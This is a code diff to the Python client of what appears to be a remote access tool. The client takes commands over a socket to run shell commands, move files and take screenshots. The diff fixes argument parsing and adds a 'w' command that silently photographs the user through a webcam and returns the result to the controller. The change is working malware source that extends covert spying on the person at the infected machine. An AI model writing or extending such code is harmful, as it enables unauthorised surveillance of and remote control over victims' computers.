@@ -9,6 +9,7 @@ import os
 import zipfile
 # non-standard libraries
 import mss
+import cv2
 
 
 class Client:
@@ -22,15 +23,17 @@ class Client:
             attribute = received[1:].split(" @ ")
 
             if command == "c":
-                self.execute_command(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0]):])
+                self.execute_command(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
             elif command == "d":
                 self.download_file(attribute[0])
             elif command == "u":
                 self.upload_file(attribute[0])
             elif command == "s":
-                self.make_screenshot(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0]):])
+                self.make_screenshot(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
             elif command == "z":
                 self.zip_file_or_folder(attribute[0][0], attribute[0][1:], attribute[1])
+            elif command == "w":
+                self.capture_camera_picture(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
             elif command == "r":
                 self.connection.sock.close()
                 self.exit = True
@@ -95,6 +98,22 @@ class Client:
             error = "[-] PermissionError"
         except FileNotFoundError:
             error = "[-] FileNotFoundError"
+        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
+
+    def capture_camera_picture(self, camera_port, path_to_save):
+        print(path_to_save)
+        error = "no error"
+        video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
+        if not video_capture.isOpened():
+            error = "[-] CouldNotOpenDevice"
+            self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
+            return
+        success, frame = video_capture.read()
+        if not success:
+            error = "[-] UnableToCapturePicture"
+        video_capture.release()
+        cv2.destroyAllWindows()
+        cv2.imwrite(path_to_save, frame)
         self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
 
 
